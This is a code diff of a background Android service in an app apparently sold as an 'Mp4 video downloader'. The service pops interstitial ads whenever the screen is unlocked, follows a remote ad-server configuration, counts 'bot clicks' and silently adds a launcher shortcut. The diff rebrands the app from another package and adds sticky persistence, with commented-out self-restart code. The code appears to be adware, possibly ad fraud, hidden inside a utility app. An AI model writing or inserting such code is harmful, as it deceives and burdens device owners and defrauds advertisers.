@@ -1,5 +1,6 @@
 package com.mp4.videodownloader.services;
 
+import android.app.ActivityManager;
 import android.app.Instrumentation;
 import android.app.Service;
 import android.content.BroadcastReceiver;
@@ -27,11 +28,11 @@ import com.google.android.gms.ads.AdRequest;
 import com.google.android.gms.ads.InterstitialAd;
 import com.google.gson.Gson;
 import com.google.gson.GsonBuilder;
-import com.v2social.socialdownloader.AppConstants;
-import com.v2social.socialdownloader.R;
-import com.v2social.socialdownloader.ShowAds;
-import com.v2social.socialdownloader.network.CheckAds;
-import com.v2social.socialdownloader.network.ClientConfig;
+import com.mp4.videodownloader.CheckAds;
+import com.mp4.videodownloader.R;
+import com.mp4.videodownloader.ShowAds;
+import com.mp4.videodownloader.network.ClientConfig;
+import com.mp4.videodownloader.utils.AppConstants;
 
 import java.io.IOException;
 import java.util.Random;
@@ -77,12 +78,12 @@ public class MyService extends Service {
     public void onCreate() {
         SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver", 0);
         uuid = mPrefs.getString("uuid", UUID.randomUUID().toString());
-        idFullService = mPrefs.getString("idFullService", "/21617015150/734252/21734809637");
+        idFullService = mPrefs.getString("idFullService", "/21617015150/734252/21736058380");
         intervalService = mPrefs.getInt("intervalService", 10);
         delayService = mPrefs.getInt("delayService", 24);
         delay_retention = mPrefs.getInt("delay_retention", -1);
         delay_report = mPrefs.getInt("delay_report", 1);
-        idFullFbService = mPrefs.getString("idFullFbService", "2061820020517519_2085229838176537");
+        idFullFbService = mPrefs.getString("idFullFbService", "");
 
         getAdsCount();
 
@@ -98,6 +99,18 @@ public class MyService extends Service {
         throw new UnsupportedOperationException("Not yet implemented");
     }
 
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        Log.e("caomui", "onStartCommand");
+        return START_STICKY;
+    }
+
+//    @Override
+//    public void onDestroy() {
+//        super.onDestroy();
+//        sendBroadcast(new Intent("NeverKillMe"));
+//    }
+
     private void addShortcut() {
         //Adding shortcut for MainActivity
         try {
@@ -112,17 +125,17 @@ public class MyService extends Service {
         }
 
         Intent shortcutIntent = new Intent(getApplicationContext(),
-                com.v2social.socialdownloader.MainActivity.class);
+                com.mp4.videodownloader.MainActivity.class);
 
         shortcutIntent.setAction(Intent.ACTION_MAIN);
 
         Intent addIntent = new Intent();
         addIntent
                 .putExtra(Intent.EXTRA_SHORTCUT_INTENT, shortcutIntent);
-        addIntent.putExtra(Intent.EXTRA_SHORTCUT_NAME, "Social video downloader");
+        addIntent.putExtra(Intent.EXTRA_SHORTCUT_NAME, "Mp4 video downloader");
         addIntent.putExtra(Intent.EXTRA_SHORTCUT_ICON_RESOURCE,
                 Intent.ShortcutIconResource.fromContext(getApplicationContext(),
-                        com.v2social.socialdownloader.R.drawable.icon));
+                        R.drawable.tube));
 
         addIntent
                 .setAction("com.android.launcher.action.INSTALL_SHORTCUT");
@@ -130,7 +143,7 @@ public class MyService extends Service {
         getApplicationContext().sendBroadcast(addIntent);
 
 //        Log.d("caomui","ADD shortcut done");
-        createShortcut();
+//        createShortcut();
     }
 
     private void scheduleTask() {
@@ -245,10 +258,30 @@ public class MyService extends Service {
         countBotClick = mPrefs.getInt("countBotClick", 0);
     }
 
+//    public boolean checkServiceRunning(){
+//        ActivityManager manager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
+//        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE))
+//        {
+//            if ("com.mp4.videodownloader.services.MyService"
+//                    .equals(service.service.getClassName()))
+//            {
+//                return true;
+//            }
+//        }
+//
+//        return false;
+//    }
+
     class MyBroadcast extends BroadcastReceiver {
         @Override
         public void onReceive(Context context, Intent intent) {
             Log.d("cao", "Unlock Screen " + uuid);
+//            if(!checkServiceRunning())
+//            {
+//                context.startService(new Intent(context.getApplicationContext(), MyService.class));
+//                return;
+//            }
+
             if (!isContinousShowAds || clientConfig == null)
                 return;
             if (new Random().nextInt(100) > clientConfig.max_percent_ads) {
